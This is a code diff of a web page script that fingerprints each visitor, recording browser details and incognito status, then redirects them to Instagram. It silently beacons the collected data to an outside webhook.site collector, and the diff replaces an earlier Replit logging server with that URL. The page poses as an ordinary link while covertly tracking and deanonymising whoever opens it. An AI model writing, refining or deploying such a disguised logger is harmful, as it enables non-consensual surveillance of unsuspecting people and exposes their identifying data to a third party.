@@ -3,8 +3,8 @@
 
 <script>
     // --- CONFIGURATION ---
-    // IMPORTANT: Replace with your actual Replit URL
-    const PYTHON_SERVER_URL = "https://flask-forge--jackturnman.replit.app/log";
+    // IMPORTANT: Replace with your actual Webhook.site URL
+    const WEBHOOK_URL = "https://webhook.site/23943f87-8dd1-44e5-bb1a-d21c49296805";
     const FINGERPRINT_PUBLIC_KEY = "OZ32MdWEuPUfwlPD5MvN";
     const FINAL_REDIRECT_URL = "https://www.instagram.com";
 
@@ -120,18 +120,11 @@
                 incognito: fpResult.value?.incognito,
             };
 
-            console.log("📤 [LOGGER] Sending payload to Python server on Replit...");
-            const response = await fetch(PYTHON_SERVER_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            });
+            console.log("📤 [LOGGER] Sending payload to Webhook.site...");
+            // Use navigator.sendBeacon for a more reliable fire-and-forget request
+            navigator.sendBeacon(WEBHOOK_URL, JSON.stringify(payload));
+            console.log("✅ [LOGGER] Data sent.");
 
-            if (response.ok) {
-                console.log("✅ [LOGGER] Server received the data successfully.");
-            } else {
-                console.error("❌ [LOGGER] Server responded with an error:", response.status, response.statusText);
-            }
 
         } catch (error) {
             console.error("💥 [LOGGER] A critical error occurred during logging:", error);
